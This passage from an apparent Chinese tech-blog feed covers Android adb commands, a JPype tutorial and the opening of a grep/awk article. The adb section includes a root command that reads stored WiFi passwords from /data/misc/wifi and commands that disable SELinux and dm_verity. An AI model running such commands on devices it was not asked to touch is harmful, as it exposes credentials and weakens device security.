<tr>
<td><code>apps</code></td>
<td>所有应用</td>
</tr>
<tr>
<td><code>*</code></td>
<td>所有界面</td>
</tr>
<tr>
<td><code>package-name</code></td>
<td>指定应用</td>
</tr>
<tr>
<td><code>-package-name</code></td>
<td>排除指定应用</td>
</tr>
</tbody>
</table>
<p>例如：</p>
<pre><code>adb shell settings put global policy_control immersive.full=*
复制代码
</code></pre>
<p>表示设置在所有界面下都同时隐藏状态栏和导航栏。</p>
<pre><code>adb shell settings put global policy_control immersive.status=com.package1,com.package2:immersive.navigation=apps,-com.package3
复制代码
</code></pre>
<p>表示设置在包名为 <code>com.package1</code> 和 <code>com.package2</code> 的应用里隐藏状态栏，在除了包名为 <code>com.package3</code> 的所有应用里隐藏导航栏。</p>
<h3 id="411-实用功能">4.11 实用功能</h3>
<h4 id="4111-屏幕截图">4.11.1 屏幕截图</h4>
<p>截图保存到电脑：</p>
<pre><code>adb exec-out screencap -p &gt; sc.png
复制代码
</code></pre>
<p>如果 adb 版本较老，无法使用 <code>exec-out</code> 命令，这时候建议更新 adb 版本。无法更新的话可以使用以下麻烦点的办法：</p>
<p>先截图保存到设备里：</p>
<pre><code>adb shell screencap -p /sdcard/sc.png
复制代码
</code></pre>
<p>然后将 png 文件导出到电脑：</p>
<pre><code>adb pull /sdcard/sc.png
复制代码
</code></pre>
<p>可以使用 <code>adb shell screencap -h</code> 查看 <code>screencap</code> 命令的帮助信息，下面是两个有意义的参数及含义：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-p</td>
<td>指定保存文件为 png 格式</td>
</tr>
<tr>
<td>-d display-id</td>
<td>指定截图的显示屏编号（有多显示屏的情况下）</td>
</tr>
</tbody>
</table>
<p>实测如果指定文件名以 <code>.png</code> 结尾时可以省略 -p 参数；否则需要使用 -p 参数。如果不指定文件名，截图文件的内容将直接输出到 stdout。</p>
<p>另外一种一行命令截图并保存到电脑的方法：<em>Linux 和 Windows</em></p>
<pre><code>adb shell screencap -p | sed &quot;s/\r$//&quot; &gt; sc.png
复制代码
</code></pre>
<p><em>Mac OS X</em></p>
<pre><code>adb shell screencap -p | gsed &quot;s/\r$//&quot; &gt; sc.png
复制代码
</code></pre>
<p>这个方法需要用到 gnu sed 命令，在 Linux 下直接就有，在 Windows 下 Git 安装目录的 bin 文件夹下也有。如果确实找不到该命令，可以下载 <a href="https://link.juejin.im?target=http%3A%2F%2Fgnuwin32.sourceforge.net%2Fpackages%2Fsed.htm">sed for Windows</a> 并将 sed.exe 所在文件夹添加到 PATH 环境变量里。</p>
<p>而在 Mac 下使用系统自带的 sed 命令会报错：</p>
<pre><code>sed: RE error: illegal byte sequence
复制代码
</code></pre>
<p>需要安装 gnu-sed，然后使用 gsed 命令：</p>
<pre><code>brew install gnu-sed
复制代码
</code></pre>
<h4 id="4112-录制屏幕">4.11.2 录制屏幕</h4>
<p>录制屏幕以 mp4 格式保存到 /sdcard：</p>
<pre><code>adb shell screenrecord /sdcard/filename.mp4
复制代码
</code></pre>
<p>需要停止时按 Ctrl-C，默认录制时间和最长录制时间都是 180 秒。</p>
<p>如果需要导出到电脑：</p>
<pre><code>adb pull /sdcard/filename.mp4
复制代码
</code></pre>
<p>可以使用 <code>adb shell screenrecord --help</code> 查看 <code>screenrecord</code> 命令的帮助信息，下面是常见参数及含义：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>--size WIDTHxHEIGHT</td>
<td>视频的尺寸，比如 <code>1280x720</code>，默认是屏幕分辨率。</td>
</tr>
<tr>
<td>--bit-rate RATE</td>
<td>视频的比特率，默认是 4Mbps。</td>
</tr>
<tr>
<td>--time-limit TIME</td>
<td>录制时长，单位秒。</td>
</tr>
<tr>
<td>--verbose</td>
<td>输出更多信息。</td>
</tr>
</tbody>
</table>
<h4 id="4113-查看连接过的-wifi-密码">4.11.3 查看连接过的 WiFi 密码</h4>
<p><strong>注：需要 root 权限。</strong></p>
<pre><code>adb shell
su
cat /data/misc/wifi/*.conf
复制代码
</code></pre>
<h4 id="4114-设置系统日期和时间">4.11.4 设置系统日期和时间</h4>
<p><strong>注：需要 root 权限。</strong></p>
<pre><code>adb shell
su
date -s 20160823.131500
复制代码
</code></pre>
<p>表示将系统日期和时间更改为 2016 年 08 月 23 日 13 点 15 分 00 秒。</p>
<h4 id="4115-重启手机">4.11.5 重启手机</h4>
<pre><code>adb reboot
复制代码
</code></pre>
<h4 id="4116-检测设备是否已-root">4.11.6 检测设备是否已 root</h4>
<pre><code>adb shell
su
复制代码
</code></pre>
<p>此时命令行提示符是 <code>$</code> 则表示没有 root 权限，是 <code>#</code> 则表示已 root。</p>
<h4 id="4117-使用-monkey-进行压力测试">4.11.7 使用 Monkey 进行压力测试</h4>
<p>Monkey 可以生成伪随机用户事件来模拟单击、触摸、手势等操作，可以对正在开发中的程序进行随机压力测试。</p>
<p>简单用法：</p>
<pre><code>adb shell monkey -p &lt;packagename&gt; -v 500
复制代码
</code></pre>
<p>表示向 <code>&lt;packagename&gt;</code> 指定的应用程序发送 500 个伪随机事件。Monkey 的详细用法参考 <a href="https://link.juejin.im?target=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Ftest%2Fmonkey.html">官方文档</a>。</p>
<h4 id="4118-开启关闭-wifi">4.11.8 开启/关闭 WiFi</h4>
<p><strong>注：需要 root 权限。</strong></p>
<ul>
<li>开启 WiFi：</li>
</ul>
<pre><code>adb root
adb shell svc wifi enable
复制代码
</code></pre>
<ul>
<li>关闭 WiFi：</li>
</ul>
<pre><code>adb root
adb shell svc wifi disable
复制代码
</code></pre>
<p>若执行成功，输出为空；若未取得 root 权限执行此命令，将执行失败，输出 <code>Killed</code>。</p>
<h3 id="412-刷机相关命令">4.12 刷机相关命令</h3>
<h4 id="4121-重启到-recovery-模式">4.12.1 重启到 Recovery 模式</h4>
<pre><code>adb reboot recovery
复制代码
</code></pre>
<h4 id="4122-从-recovery-重启到-android">4.12.2 从 Recovery 重启到 Android</h4>
<pre><code>adb reboot
复制代码
</code></pre>
<h4 id="4122-重启到-fastboot-模式">4.12.2 重启到 Fastboot 模式</h4>
<pre><code>adb reboot bootloader
复制代码
</code></pre>
<h4 id="4124-通过-sideload-更新系统">4.12.4 通过 sideload 更新系统</h4>
<p>如果我们下载了 Android 设备对应的系统更新包到电脑上，那么也可以通过 adb 来完成更新。</p>
<p>以 Recovery 模式下更新为例：</p>
<ol>
<li>重启到 Recovery 模式。</li>
</ol>
<pre><code>adb reboot recovery
复制代码
</code></pre>
<ol>
<li>在设备的 Recovery 界面上操作进入 <code>Apply update</code>-<code>Apply from ADB</code>。注：不同的 Recovery 菜单可能与此有差异，有的是一级菜单就有 <code>Apply update from ADB</code>。</li>
<li>通过 adb 上传和更新系统。</li>
</ol>
<pre><code>adb sideload &lt;path-to-update.zip&gt;
复制代码
</code></pre>
<h3 id="413-安全相关命令">4.13 安全相关命令</h3>
<h4 id="4131-启用禁用-selinux">4.13.1 启用/禁用 SELinux</h4>
<p>启用 SELinux</p>
<pre><code>adb root
adb shell setenforce 1
复制代码
</code></pre>
<p>禁用 SELinux</p>
<pre><code>adb root
adb shell setenforce 0
复制代码
</code></pre>
<h4 id="4132-启用禁用-dm_verity">4.13.2 启用/禁用 dm_verity</h4>
<p>启用 dm_verity</p>
<pre><code>adb root
adb enable-verity
复制代码
</code></pre>
<p>禁用 dm_verity</p>
<pre><code>adb root
adb disable-verity
复制代码
</code></pre>
<h3 id="414-更多-adb-shell-命令">4.14 更多 adb shell 命令</h3>
<p>Android 系统是基于 Linux 内核的，所以 Linux 里的很多命令在 Android 里也有相同或类似的实现，在 <code>adb shell</code> 里可以调用。本文档前面的部分内容已经用到了 <code>adb shell</code> 命令。</p>
<h4 id="4141-查看进程状态">4.14.1 查看进程状态</h4>
<pre><code>adb shell ps
复制代码
</code></pre>
<p>输出信息各列含义：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>USER</td>
<td>所属用户</td>
</tr>
<tr>
<td>PID</td>
<td>进程 ID</td>
</tr>
<tr>
<td>PPID</td>
<td>父进程 ID</td>
</tr>
<tr>
<td>NAME</td>
<td>进程名</td>
</tr>
</tbody>
</table>
<h4 id="4142-查看处理器实时状态">4.14.2 查看处理器实时状态</h4>
<pre><code>adb shell top [-m max_procs] [-n iterations] [-d delay] [-s sort_column] [-t] [-h]
复制代码
</code></pre>
<p><code>adb shell top</code> 后面可以跟一些可选参数进行过滤查看不同的列表，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-m</td>
<td>最多显示多少个进程</td>
</tr>
<tr>
<td>-n</td>
<td>刷新多少次后退出</td>
</tr>
<tr>
<td>-d</td>
<td>刷新时间间隔(单位秒，默认值5)</td>
</tr>
<tr>
<td>-s</td>
<td>按某列排序(可用col值：cpu, vss, rss, thr)</td>
</tr>
<tr>
<td>-t</td>
<td>显示线程信息</td>
</tr>
<tr>
<td>-h</td>
<td>显示帮助文档</td>
</tr>
</tbody>
</table>
<p>输出信息各列含义：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>PID</td>
<td>进程 ID</td>
</tr>
<tr>
<td>PR</td>
<td>优先级</td>
</tr>
<tr>
<td>CPU%</td>
<td>当前瞬间占用 CPU 百分比</td>
</tr>
<tr>
<td>S</td>
<td>进程状态（R=运行，S=睡眠，T=跟踪/停止，Z=僵尸进程）</td>
</tr>
<tr>
<td>#THR</td>
<td>线程数</td>
</tr>
<tr>
<td>VSS</td>
<td>Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）</td>
</tr>
<tr>
<td>RSS</td>
<td>Resident Set Size 实际使用物理内存（包含共享库占用的内存）</td>
</tr>
<tr>
<td>PCY</td>
<td>调度策略优先级，SP_BACKGROUND/SPFOREGROUND</td>
</tr>
<tr>
<td>UID</td>
<td>进程所有者的用户 ID</td>
</tr>
<tr>
<td>NAME</td>
<td>进程名</td>
</tr>
</tbody>
</table>
<h4 id="4143-查看进程-uid">4.14.3 查看进程 UID</h4>
<p>有两种方案：</p>
<ol>
<li><code>adb shell dumpsys package &lt;packagename&gt; | grep userId=</code>如：</li>
</ol>
<pre><code> adb shell dumpsys package org.mazhuang.guanggoo | grep userId=
  userId=10394
复制代码
</code></pre>
<ol>
<li>
<p>通过 ps 命令找到对应进程的 pid 之后</p>
<pre><code>adb shell cat /proc/&lt;pid&gt;/status | grep Uid
</code></pre>
<p>如：</p>
<pre><code>adb shell
gemini:/ $ ps | grep org.mazhuang.guanggoo
u0_a394   28635 770   1795812 78736 SyS_epoll_ 0000000000 S org.mazhuang.guanggoo
gemini:/ $ cat /proc/28635/status | grep Uid
Uid:    10394   10394   10394   10394
gemini:/ $
复制代码
</code></pre>
</li>
</ol>
<h2 id="五-致谢">五、致谢</h2>
<ol>
<li><a href="https://link.juejin.im?target=http%3A%2F%2Fadbshell.com%2F">ADB Shell</a></li>
<li><a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fmzlogin%2Fawesome-adb">Awesome Adb</a></li>
<li><a href="https://link.juejin.im?target=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Fcommand-line%2Fadb">Android Debug Bridge</a></li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JPype使用小结]]></title>
        <id>http://wangqunsong.github.io/post/jpype-shi-yong-xiao-jie</id>
        <link href="http://wangqunsong.github.io/post/jpype-shi-yong-xiao-jie">
        </link>
        <updated>2018-10-16T14:21:31.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>JPype使用小结</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>JPype使用小结</strong></p>
<!-- more -->
<h4 id="概述">概述</h4>
<p>​        很多人都知道 <strong>Jython（</strong> 也叫<strong>JPython）</strong>，<strong>Jython</strong> 是在 Java 虚拟机(JVM) 上运行 <strong>python</strong> 代码的一种语言（没错，<em>Jython</em>是一种语言），显而易见，<strong>Jython</strong> 是给 <strong>Java程序员</strong> 运行 <strong>Python</strong> 程序用的。</p>
<p>​      而 <strong>JPype</strong> 是一个库，是给 <strong>python</strong>程序员 运行 <strong>Java</strong> 程序用的，<strong>JPype</strong>提供了<strong>python</strong>访问<strong>Java</strong>代码的能力。用更正式的话来说：</p>
<!--more-->
<blockquote>
<p>JPype 是一个能够让 Python 代码方便地调用 Java 代码的工具，从而克服了 Python 在某些领域（如服务器端编程）中的不足。(引自<a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-jpype/index.html">IBM</a>)</p>
</blockquote>
<h4 id="环境">环境</h4>
<p>​    本文使用的操作系统为windows 10，Java和Python版本如下：</p>
<h5 id="java版本">JAVA版本</h5>
<pre><code class="language-java">D:\&gt;java -version
java version &quot;1.8.0_101&quot;
Java(TM) SE Runtime Environment (build 1.8.0_101-b13)
Java HotSpot(TM) 64-Bit Server VM (build 25.101-b13, mixed mode)
</code></pre>
<h5 id="python版本">Python版本</h5>
<pre><code class="language-python">D:\&gt;python3
Python 3.5.2 (v3.5.2:4def2a2901a5, Jun 25 2016, 22:18:55) [MSC v.1900 64 bit (AMD64)] on win32
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt;
</code></pre>
<p>注：本文虽然使用了3.5版本，但<strong>JPype</strong> 可以同时支持 2.7 和 3.5 ，而且在 2.7 上安装 <strong>JPype</strong> 比 3.5 上更方便。</p>
<h4 id="安装">安装</h4>
<p>​    在 <strong>Python 3.5</strong> 中，安装 <strong>JPype</strong> 不能直接使用 <strong>pip3</strong> 安装，因为<strong>JPype</strong>开发时Python3还未流行起来，所以<strong>JPype</strong> 默认是为 <strong>Python2</strong> 编写的。不过有大牛为 <strong>Python3</strong> 编写了一个兼容的版本，所以我们需要用源码安装，具体步骤为：</p>
<pre><code class="language-shell">&gt; git clone https://github.com/tcalmant/jpype-py3.git
&gt; cd jpype-py3
&gt; python3 setup.py install
</code></pre>
<p>注：若编译出错，请检查一下系统是否缺乏 <code>python3-dev</code> 库，或者是否安装了 <strong>C++</strong> 编译工具。至于为什么需要C++编译工具，因为<strong>JPype</strong>是用<strong>JNI</strong>实现的。</p>
<blockquote>
<p>什么是JNI？（源自<a href="https://zh.wikipedia.org/wiki/Java%E6%9C%AC%E5%9C%B0%E6%8E%A5%E5%8F%A3">维基百科</a>）</p>
</blockquote>
<h4 id="简单示例">简单示例</h4>
<p>先看一小段简单代码：</p>
<pre><code class="language-py">import jpype
from jpype import *

if __name__ == &quot;__main__&quot;:
    startJVM(jpype.getDefaultJVMPath())
    java.lang.System.out.println(&quot;Hello World&quot;)
    shutdownJVM()
</code></pre>
<p>​      代码很简单，开头的 <code>import</code> 导入了JPype，关键代码都在 <code>__main__</code> 里，主要是第一句<code>startJVM</code>和第三句<code>shutdownJVM</code>，其实就是开启和关闭 <strong>JVM</strong> 的执行环境；然后中间这一句输出了<code>hello world.</code>可以看到，除了和在 <strong>Java</strong> 中直接调用 <code>System.out.println</code> 多了前面的包名之外，其他和Java原生代码是一样的。</p>
<h4 id="不止于helloworld">不止于Hello，World</h4>
<p>​       输出<code>Hello World</code>并没有什么实际意义，以上只是了解下<em>JPype</em>的工作流程，更常见的，我们要开始调用自己的<em>Java</em>代码。<strong>JPype</strong>调用<strong>Java</strong>代码有两种方式，第一种是直接编译，把所有的东西放在一个文件夹里；第二种是将源代码打包成一个<code>jar</code>包然后调用。这里使用第二种方式介绍。</p>
<p>​      假设你有一个<strong>JAVA</strong>类如下：</p>
<pre><code class="language-java">package com.test;

import org.apache.log4j.Logger;
public class Demo {
   public static Logger logger =Logger.getLogger(MathDemo.class.getName());
   public int add(int a, int b) {
     return a+b;
   }
}
</code></pre>
<p>以上Demo类中有个一个add方法，并且该类依赖于第三方依赖包<code>log4j-1.2.16.jar</code>。将此源码打包编译为<code>Demo.jar</code>，所在路径为<code>E:/Test/Demo.jar</code>,并将第三方依赖包拷贝到<code>E:/Test/dependent</code>路径下，然后我们用<em>Python</em>调用以上代码如下;</p>
<pre><code class="language-py">from jpype import *
import os

jar_path = os.path.join(os.path.abspath('.'), 'E:/Test/Demo.jar')   #源码包路径
dependent_path = os.path.join(os.path.abspath('.'), 'E:/Test/dependent') #第三方依赖包路径
startJVM(getDefaultJVMPath(), &quot;-Djava.class.path=&quot; + jar_path,&quot;-Djava.ext.dirs=&quot; + dependent_path)    #当有第三方依赖的jar包时，必须添加-Djava.ext.dirs参数
if not isJVMStarted():
    startJVM(getDefaultJVMPath(), &quot;-Djava.class.path=&quot; + jar_path,&quot;-Djava.ext.dirs=&quot; + dependent_path)
JClass = JClass('com.test.Demo')
jpype_test = JClass()
add_result = (jpype_test.add(1, 2))
print (add_result)
shutdownJVM()
</code></pre>
<p>或者还可以这样：</p>
<pre><code>from jpype import *
import os

jar_path = os.path.join(os.path.abspath('.'), 'E:/Test/Demo.jar')   #源码包路径
dependent_path = os.path.join(os.path.abspath('.'), 'E:/Test/dependent') #第三方依赖包路径
startJVM(getDefaultJVMPath(), &quot;-Djava.class.path=&quot; + jar_path,&quot;-Djava.ext.dirs=&quot; + dependent_path)    #当有第三方依赖的jar包时，必须添加-Djava.ext.dirs参数
if not isJVMStarted():
    startJVM(getDefaultJVMPath(), &quot;-Djava.class.path=&quot; + jar_path,&quot;-Djava.ext.dirs=&quot; + dependent_path)
JClass = JClass('com.test.Demo')
jpype_test = JPackage('com').test.Demo
add_result = (jpype_test.add(1, 2))
print (add_result)
shutdownJVM()
</code></pre>
<p>​      以上两种方法大部分是一样的，不同的仅仅是一个使用了<code>JClass</code>方法，另一个用了<code>JPackage</code>方法，而<code>JPackage</code>对类的访问也是依靠<code>Jclass</code>，只不过其提供了对包的访问。归根结底，能否找到类还是要依靠_jpype.findClass()这个函数。</p>
<p><strong>注意事项：</strong></p>
<p>​    1.运行以上代码可能会出现以下错误：</p>
<pre><code>jpype._jexception.ExceptionPyRaisable: java.lang.Exception: Class not found
</code></pre>
<p>​    这是因为在启动JVM的时候，JPype默认不会把JDK中 “\jre\lib\ext” 下的JAR包引入，所以为了避免调用过程中出现问题，建议将 “\jre\lib\ext” 或者其他依赖的所有jar包, 均放入我们自己的 &quot;dependent&quot; 目录。</p>
<p>2.我在使用过程中还碰到另一种情况：</p>
<p>​      即使拷贝了所有的jar包到dependent目录下，运行时还是报以上错误；后来发现可能与jar的打包方式有关，由于原来使用了eclipse的<strong>Fat Jar</strong>打包插件，打包时并没有生成 .class文件，而Python调用时，导入的其实是.class文件，最终用eclipse自带的打包工具重新打包才得以解决。（这里一直有些不大明白，有其他原因希望大牛解答）</p>
<h4 id="debug">DEBUG</h4>
<p>​      JPype一个很蛋疼的地方是，绝大部分都只返回<code>Class not found</code>错误，并未给出更多的错误信息。所以这时就需要Debug来进一步分析，具体方法为：</p>
<pre><code class="language-py">编辑JPype安装目录下的native/common/include/jpype.h文件，第23行
//#define JPYPE_TRACING_INTERNAL
被注释掉了，去掉开头的//，然后回到Jpype的目录下，重新编译JPype，执行
python3 setup.py build -f
python3 setup.py install -f
</code></pre>
<p>再运行你的代码即可看到debug信息。</p>
<h4 id="性能">性能</h4>
<p>​        对于跨语言调用，离不开的一个话题就是性能了，对于 <em>JPype</em>来说，因为它底层使用的是<em>JNI</em>：<strong>JNI</strong> 在<code>Java</code> 中被用来和低层的 <code>C/C++</code> 代码进行交互，因此可以发现 JPype 其实不是简单得做了一层转换，实际上是做了两层的转换。</p>
<p>​        但事实上，在 Python 中使用 Java 代码有点类似于在 Python 中部分用 C 代码一样，不仅不会降低 python 代码的性能，反而会提高 python 代码的性能。既然是跨语言，那么当频繁交互时必然会带来更多开销，如果你经常往 Java 代码中传递相同的对象(例如 String/Object/Array)的话，那么可以使用包装器来预转换，这样多少能提升一些代码的执行速度。</p>
<h4 id="数据类型">数据类型</h4>
<p>​        不同的语言支持的数据类型是不一样的，<code>Java</code>中有 int,long,double,float 等类型，而 python 中没有 double ，只有 float，所以如何进行数据转换也是一个问题。以下为Java 类型到 python 类型的转换：</p>
<table>
<thead>
<tr>
<th><code>Java 类型</code></th>
<th><code>转换成的 python 类型</code></th>
</tr>
</thead>
<tbody>
<tr>
<td>byte, short and int</td>
<td>int</td>
</tr>
<tr>
<td>long</td>
<td>long</td>
</tr>
<tr>
<td>float and double</td>
<td>float</td>
</tr>
<tr>
<td>boolean</td>
<td>int of value 1 or 0</td>
</tr>
<tr>
<td>char</td>
<td><code>unicode of length 1</code></td>
</tr>
<tr>
<td>String</td>
<td>unicode</td>
</tr>
<tr>
<td>arrays</td>
<td>JArray</td>
</tr>
<tr>
<td><code>other Java object</code></td>
<td>JavaObject</td>
</tr>
<tr>
<td>Class</td>
<td>JavaClass</td>
</tr>
<tr>
<td>array Class</td>
<td>JavaArrayClass</td>
</tr>
</tbody>
</table>
<h4 id="java异常处理">Java异常处理</h4>
<p>​        如果希望在 <strong>Python</strong> 中捕获 <strong>Java</strong> 异常的话，那么 <strong>JPype</strong> 提供有 <code>JavaException</code> 这个类用于捕获所有的 <strong>Java</strong> 异常，通过捕获 <code>JavaException</code> 这个类，你可以使用 <code>message()</code>， <code>stackTrace()</code> 和 <code>javaClass()</code> 这些方法来获得更多的异常信息。这里举个简单的例子：</p>
<pre><code class="language-java">try :
    # Code that throws a java.lang.RuntimeException
except JavaException, ex :
    if JavaException.javaClass() is java.lang.RuntimeException :
        print &quot;Caught the runtime exception : &quot;, JavaException.message()
        print JavaException.stackTrace()
</code></pre>
<p>如果你真的想直接捕获<strong>真正</strong>的 <strong>Java</strong> 异常的话，那么你可以使用 <code>JException</code> 这个装饰器，例如：</p>
<pre><code>try :
    # Code that throws a java.lang.RuntimeException
except jpype.JException(java.lang.RuntimeException), ex :
    print &quot;Caught the runtime exception : &quot;, JavaException.message()
    print JavaException.stackTrace()
</code></pre>
<h4 id="jpype的局限">JPype的局限</h4>
<h5 id="1不能重启jvm">1.不能重启JVM</h5>
<p>​       有时我们只会偶尔跑一下 <strong>Java代码</strong>，并不会一直运行着，这时候，为了性能考虑，可能回想在运行完 <strong>Java代码</strong> 之后会关掉 <strong>JVM</strong>，然后在下次运行<strong>Java代码</strong>的时候再启动一次<strong>JVM</strong>。然而，这样并不可行：</p>
<pre><code class="language-python">import jpype
from jpype import *


if __name__ == &quot;__main__&quot;:
    print(jpype.getDefaultJVMPath())
    startJVM(jpype.getDefaultJVMPath())
    java.lang.System.out.println(&quot;这是第一次运行&quot;)
    shutdownJVM()

    startJVM(jpype.getDefaultJVMPath())
    java.lang.System.out.println(&quot;这是第二次运行&quot;)
    shutdownJVM()
</code></pre>
<p>​        执行以上代码，你会发现报错了，没错，在第二次启动 <strong>JVM</strong> 的时候出错了，<strong>JVM</strong>居然启动不起来了！！！这是 BUG，而且是很久的 BUG，更蛋疼的是，作者也并不想修复这个BUG，详细内容可移步<a href="https://github.com/originell/jpype/issues/84">ISSUE 84</a> 。</p>
<p>​        这个不合理的设计背后，其实是有原因的。 JPype 底层依赖的是 JNI，然后 JNI 的 API 中实现了一个 <code>destroyJVM()</code> 的函数，然而这个函数并不工作，所以当再次调用 <code>startupJVM()</code> 的时候，得到的会是一个异常。</p>
<h5 id="2依赖于当前类的方法">2.依赖于“当前类”的方法</h5>
<p>​        在 <strong>Java</strong> 的库中，有很多方法依赖于调用的类来查找信息，所以，当我们在 <strong>Python</strong> 中调用这些方法时，就会出错，因为没有<strong>java 调用类</strong>提供给它，而且 <strong>JNI api</strong> 也没有办法来提供仿真的方法。</p>
<p>目前遇到过会出现这种问题的函数有：</p>
<pre><code class="language-java">java.lang.Class.forName(String classname);
java.sql.DriverManager.getConnection(...);
</code></pre>
<p>第一句可以使用这种方式类替换：</p>
<pre><code class="language-java">Class.forName(classname, True, ClassLoader.getSystemClassLoader())
</code></pre>
<p>第二句的话可以先实例化好 driver 对象，然后再传递给 connect 方法了。</p>
<h4 id="总结">总结</h4>
<p>​       在使用JPype的过程中，你一定会遇到各种各样的问题，解决这些问题的过程，其实是个最好的学习过程！</p>
<blockquote>
<p>声明：转载请注明出处！</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[聊聊Linux三剑客]]></title>
        <id>http://wangqunsong.github.io/post/liao-liao-linux-san-jian-ke</id>
        <link href="http://wangqunsong.github.io/post/liao-liao-linux-san-jian-ke">
        </link>
        <updated>2018-10-12T14:22:52.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>聊聊Linux三剑客</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>聊聊Linux三剑客</strong></p>
<!-- more -->
<h4 id="概述">概述</h4>
<p>Linux使用过程中经常碰到使用Shell脚本来处理文本文件，像检查日志，读取配置文件等；这个过程中最常用的三个命令就是<code>sed，awk和grep</code>，这里就聊聊这“三剑客”。</p>
<ul>
<li><code>grep</code>：主要用于文本<strong>内容查找</strong>，支持正则表达式。</li>
<li><code>awk</code>：主要用于文本内容的<strong>分析处理</strong>，也常用于处理数据生成报告，非常适用于需要<strong>按列</strong>处理的数据。（现在很多Linux使用<code>gawk</code>）</li>
<li><code>sed</code> : 全称为Stream editor，主要用于文本内容的<strong>编辑</strong>，默认只处理模式空间，不改变原数据，而且<code>sed</code>使用<strong>逐行读取</strong>的方式处理数据。</li>
</ul>
<h4 id="1grep">1.grep</h4>
<p>命令格式如下，使用<code>man grep</code>查看更详细的说明：</p>
<pre><code class="language-shell">NAME
       grep, egrep, fgrep - print lines matching a pattern
SYNOPSIS
       grep [OPTIONS] PATTERN [FILE...]
       grep [OPTIONS] [-e PATTERN | -f FILE] [FILE...]
</code></pre>
<h5 id="基本用法">基本用法</h5>
<pre><code class="language-shell">[wangqs@localhost shell_script]$ cat test_data 
This is first
This is second
This is third
Are you OK?
[wangqs@localhost shell_script]$ grep 'first' test_data   #默认option为-o,查找出包含'first'的行
This is first
[wangqs@localhost shell_script]$ grep -v 'first' test_data  #option为-v
This is second
This is third
Are you OK?
</code></pre>
<p><code>grep</code>默认只输出匹配的文本行，当option为<code>-o</code>时，命令行输出匹配的文本，而option为<code>-v</code>时，命令行输出没有匹配的文本行。</p>
<h4 id="2awk">2.awk</h4>
<p>​    <code>awk</code>默认使用换行符<code>\n</code>作为分隔符，然后按照分隔符划分域，<code>$0</code>表示所有域，<code>$1</code>表示第一个域，<code>$n</code>表示第n个域</p>
<h5 id="基本用法-2">基本用法</h5>
<pre><code class="language-shell">#格式
$awk 动作 文件名

#示例                     
[wangqs@localhost shell_script]$ awk '{print $0}' test_data         #test_data为数据文件名
This is first
This is second
This is third
Are you OK?
</code></pre>
<p>示例中，<code>test_data</code>是<code>awk</code>所要处理的文本文件。单引号内部有一个大括号<code>{}</code>，里面是<code>$0</code>为所有域，因此上面命令的执行结果，就是把文件内容全部打印出来。</p>
<p><code>awk</code>根据空格和制表符进行分割，所以<code>awk</code>在标准输入中同样适用：</p>
<pre><code class="language-shell">$ echo 'This is a cat' | awk '{ print $0 }'
This is a cat
$ echo 'This is a cat' | awk '{ print $1 }'
This
$ echo 'This is a cat' | awk '{ print $2 }'
is
$ echo 'This is a cat' | awk '{ print $4 }'
cat
</code></pre>
<p>当然，很多情况下，我们需要自定义分割符，例如<code>passwd</code>的内容如下，我们自定义冒号<code>:</code>为分隔符并提取用户名如下：</p>
<pre><code class="language-shell">[wangqs@localhost ~]$ cat passwd
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
wangqs:x:500:500:centos6.5:/home/wangqs:/bin/bash
jenkins:x:496:493:Jenkins Automation Server:/var/lib/jenkins:/bin/false
wangqunsong:x:501:501::/home/wangqunsong:/bin/sh
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
sonar:x:502:502::/home/sonar:/bin/bash
[wangqs@localhost ~]$ awk -F ':' '{ print $1 }' passwd      #使用-F参数指定分隔符
sshd
tcpdump
wangqs
jenkins
wangqunsong
mysql
sonar
</code></pre>
<h5 id="变量">变量</h5>
<p>变量<code>NF</code>表示有当前行有多少个字域，因此<code>$NF</code>就代表最后一个域，<code>$(NF-1)</code>代表倒数第二个域。</p>
<pre><code class="language-shell">$ echo &quot;This is a dog&quot; | awk '{ print $NF }'
dog
$ awk -F ':' '{ print $NF }' passwd            #$NF就代表最后一个域
/sbin/nologin
/sbin/nologin
/bin/bash
/bin/false
/bin/sh
/bin/bash
/bin/bash
$ awk -F ':' '{ print $1, $(NF-1) }' passwd   #$(NF-1)代表倒数第二个域
sshd /var/empty/sshd
tcpdump /
wangqs /home/wangqs
jenkins /var/lib/jenkins
wangqunsong /home/wangqunsong
mysql /var/lib/mysql
sonar /home/sonar
$ awk -F ':' '{ print NR &quot;)&quot; $1 }' passwd       # 变量NR表示当前处理的是第几行
1)sshd
2)tcpdump
3)wangqs
4)jenkins
5)wangqunsong
6)mysql
7)sonar
</code></pre>
<p>其他内置变量如下：</p>
<ul>
<li><code>FILENAME</code>：当前文件名</li>
<li><code>FS</code>：字段分隔符，默认是空格和制表符。</li>
